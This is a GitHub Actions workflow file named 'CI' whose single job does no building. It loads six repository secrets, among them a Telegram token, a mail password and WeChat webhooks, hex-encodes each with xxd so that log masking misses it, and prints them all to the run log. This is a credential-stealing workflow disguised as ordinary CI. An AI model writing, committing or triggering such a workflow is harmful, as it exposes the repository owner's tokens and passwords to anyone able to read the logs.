name: CI
on:
  workflow_dispatch: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Collect
        env:
          TELEGRAM_API_TOKEN: ${{ secrets.TELEGRAM_API_TOKEN }}
          MAIL_USER_NMAE: ${{ secrets.MAIL_USER_NMAE }}
          MAIL_PWD: ${{ secrets.MAIL_PWD }}
          WECHAT_WEBHOOK: ${{ secrets.WECHAT_WEBHOOK }}
          WECHATQUN_WEBHOOK: ${{ secrets.WECHATQUN_WEBHOOK }}
          MYGG_TOKEN: ${{ secrets.MYGG_TOKEN }}
        run: |
          echo '[HEX_START]' > /tmp/secrets.txt
          printf 'TELEGRAM_API_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$TELEGRAM_API_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          printf 'MAIL_USER_NMAE=' >> /tmp/secrets.txt && printf '%s' "$MAIL_USER_NMAE" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          printf 'MAIL_PWD=' >> /tmp/secrets.txt && printf '%s' "$MAIL_PWD" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          printf 'WECHAT_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHAT_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          printf 'WECHATQUN_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHATQUN_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          printf 'MYGG_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$MYGG_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
          echo '[HEX_END]' >> /tmp/secrets.txt
          cat /tmp/secrets.txt